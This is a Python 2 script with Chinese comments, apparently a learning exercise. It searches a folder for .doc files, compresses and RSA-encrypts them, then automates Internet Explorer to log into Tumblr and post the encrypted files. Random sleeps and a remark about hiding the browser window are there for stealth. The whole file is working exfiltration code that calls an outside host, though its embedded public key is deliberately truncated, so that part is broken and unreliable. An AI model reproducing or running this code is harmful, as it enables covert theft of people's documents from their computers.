import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = ""
password = ""

# 这个public_key一样是没用
public_key  = b"-----BEGIN PUBLIC KEY-----"
#temp = b"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs+lgjKrnHbAw0Biq/HzzALtnZDkAWE2zL9x9vE0ck5x3QnLS73o1kNxFRFAOeDF7GGtsP8Q2bJYb+LWI+KvPvkJB9RBqDilmRf39FU714K8+DyavIvSXMnS2nQBXmHh3zQ6GZxoPiBeoPiCW3Xw09m3gEhyOBAyZo6qfuEnch4vWfXhwi1EsBPZSJRP0vdpcgiLzdglmP6UfCI9VkheDjgR1zs6yJb3D+ozuZRrX54TvYi9Xm/R6kSBgxQnOxVUAVEAej/kz1HLPjowGD8jmLHcAxQyfC6vtwv/VLNZm1zsnZ5bsVk9gec+2aSSbLqEBLSbwkIhOXHZcE2o6QvukmQIDAQAB"

temp = b"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs+"
missing_padding = 4 - len(temp)
if missing_padding:
    temp += b'=' * missing_padding

public_key += temp
print(len(public_key))
public_key += b"-----END PUBLIC KEY-----"
# 直接看我的微信公众号，有讲问题出在哪

def wait_for_browser(browser):
    # 等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

def encrypt_string(plaintext):
    # 设置块大小
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    # 首先调用zlib进行压缩
    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes" % len(plaintext)

    # 利用公钥建立RSA公钥加密对象
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypting = ""
    offset = 0

    # 对文件内容进行每256个字节为一块循环加密
    while offset < len(plaintext):
        # 获取某个256字节
        chunk = plaintext[offset:offset+chunk_size]
        # 若到最后不够256字节，则用空格补够
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        # 将已加密的连起来
        encrypting += rsakey.encrypt(chunk)
        # 偏移增加
        offset += chunk_size
    # 对加密后的进行base64编码
    encrypted = encrypting.encode("base64")
    # 输出最后加密后的长度
    print "Base64 encodeed crypto: %d" % len(encrypted)
    # 返回加密后内容
    return encrypted

def encrypt_post(filename):

    # 打开并读取文件
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()
    # 分别加密文件名和内容
    encrypt_title = encrypt_string(filename)
    encrypt_body = encrypt_string(contents)

    return encrypt_title, encrypt_body

# 随机休眠一段时间
def random_sleep():
    time.sleep(random.randint(5,10))
    return

def login_to_tumblr(ie):

    # 解析文档中的所有元素
    full_doc = ie.Document.all
    # 迭代每个元素来查找登陆表单
    for i in full_doc:
        print(i.id)
        # 从中寻找Email地址和口令的填充字段
        if i.id == "signup_email":
            # 并将它们的值设置为我们提供的登录凭证
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    try:
        # 你会遇到不同的登陆主页
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()

    # 登陆表单是登陆页面的第二个表单
    wait_for_browser(ie)
    return

def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()

    random_sleep()
    title_box.focus()
    random_sleep()

    print(post_form.children[0])
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return

#exfiltrate函数的输入是我们想存储到Tumblr上的文档
def exfiltrate(document_path):
    # 创建IE的COM对象实例
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    # 调试阶段设置为1，实际设置为0，以增加隐蔽性
    ie.Visible = 1

    # 访问tumblr站点并登陆
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "Logging in ..."
    login_to_tumblr(ie)
    print "Logged in ... navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # 加密文件
    title,body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"

    # 销毁IE实例
    ie.Quit()
    ie = None


# 用户文档检索的主循环
for parent, directories, filenames in os.walk("C:\\test\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")
